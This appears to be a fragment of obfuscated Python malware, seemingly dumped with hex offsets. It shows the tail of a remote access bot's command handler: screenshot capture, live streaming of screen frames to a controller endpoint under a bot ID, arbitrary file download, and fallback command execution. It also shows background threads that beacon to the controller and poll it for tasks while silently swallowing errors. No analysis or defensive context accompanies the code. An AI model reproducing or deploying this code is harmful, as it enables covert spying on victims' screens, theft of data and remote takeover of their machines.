+0x00005DA5      # 
+0x00005DB4   SCREENSHOT 
+0x00005DCB      if _c in ("screenshot", "screen", "ss"):
+0x00005DF9          try:
+0x00005E07              from PIL import ImageGrab as _ig
+0x00005E35              _fn = "screenshot_" + str(int(_s3.time())) + ".png"
+0x00005E76              _ig.grab().save(_fn)
+0x00005E98              return "Screenshot saved: " + _fn
+0x00005EC7          except:
+0x00005ED8              return "[screenshot failed 
+0x00005F02   install pillow]"
+0x00005F1B      # 
+0x00005F2A   LIVE STREAM 
+0x00005F42      if _c.startswith("livestream"):
+0x00005F67          _p = _c.split()
+0x00005F80          try:
+0x00005F8E              if len(_p) >= 2: _FPS = int(_p[1])
+0x00005FBE              if len(_p) >= 3: _QUAL = int(_p[2])
+0x00005FEF              if len(_p) >= 4: _WIDTH = int(_p[3])
+0x00006021          except:
+0x00006032              pass
+0x00006044          _E = True
+0x00006057          
+0x00006061          def _sl():
+0x00006075              while _E:
+0x0000608C                  try:
+0x000060A2                      from PIL import ImageGrab as _ig
+0x000060D8                      _im = _ig.grab()
+0x000060FE                      if _im.width > _WIDTH:
+0x0000612A                          _ra = _WIDTH / _im.width
+0x0000615C                          _nh = int(_im.height * _ra)
+0x00006191                          _im = _im.resize((_WIDTH, _nh))
+0x000061CA                      _bf = _sb.BytesIO()
+0x000061F3                      _im.save(_bf, format='JPEG', quality=_QUAL)
+0x00006234                      _b64 = _s5.b64encode(_bf.getvalue()).decode('ascii')
+0x0000627E                      _sc.post(_U + "/stream_frame", json={
+0x000062B9                          "bot_id": _I,
+0x000062E0                          "frame": _b64,
+0x00006308                          "timestamp": int(_s3.time() * 1000)
+0x00006345                      }, timeout=5)
+0x00006368                      _s3.sleep(1.0 / _FPS)
+0x00006393                  except:
+0x000063AC                      _s3.sleep(0.5)
+0x000063D0          
+0x000063DA          _t = _s8.Thread(target=_sl, daemon=True)
+0x0000640C          _t.start()
+0x00006420          return "Live stream started"
+0x0000644C      if _c == "stopstream":
+0x00006468          _E = False
+0x0000647C          return "Live stream stopping..."
+0x000064AC      # 
+0x000064BB   DOWNLOAD 
+0x000064D0      if _c.startswith("download "):
+0x000064F4          _p = _c.split(" ", 2)
+0x00006513          if len(_p) < 3:
+0x0000652C              return "Usage: download <url> <path>"
+0x0000655F          try:
+0x0000656D              import urllib.request as _ur
+0x00006597              _ur.urlretrieve(_p[1], _p[2])
+0x000065C2              return "Downloaded: " + _p[2]
+0x000065ED          except:
+0x000065FE              return "[download failed]"
+0x0000662C      return _run(_c)
+0x00006716   THREADS
+0x000067ED  def _thread_connection():
+0x00006808      while True:
+0x00006819          try:
+0x00006827              _x2()
+0x0000683A              _s3.sleep(_R)
+0x00006855          except:
+0x00006866              _s3.sleep(_F)
+0x00006883  def _thread_commands():
+0x0000689C      while True:
+0x000068AD          try:
+0x000068BB              _d = _x3()
+0x000068D3              if _d.get("command"):
+0x000068F6                  _c = _d["command"]
+0x0000691A                  _t = _d.get("task_id", "unknown")
+0x0000694D                  _r = _xa(_c)
+0x0000696B                  if _r == "EXIT_SIGNAL":
+0x00006994                      _x4("Bot exiting...", _t)
+0x000069C3                      _s2.exit(0)
+0x000069E4                  _x4(_r, _t)
+0x00006A01              _s3.sleep(_P)
+0x00006A1C          except:
+0x00006A2D              _s3.sleep(_F)
+0x00006B1D   MAIN
+0x00006BF1  def _xb():
+0x00006BFD      _t1 = _s8.Thread(target=_thread_connection, daemon=True)
+0x00006C3B      _t1.start()
+0x00006C4C      _t2 = _s8.Thread(target=_thread_commands, daemon=True)
+0x00006C88      _t2.start()
+0x00006C99      try:
+0x00006CA3          while True:
+0x00006CB8              _s3.sleep(1)
+0x00006CD2      except KeyboardInterrupt:
+0x00006CF1          pass
+0x00006D01  if __name__ == "__main__":
+0x00006D1D      try:
+0x00006D27          _xb()
+0x00006D36      except:
+0x00006D43          pass
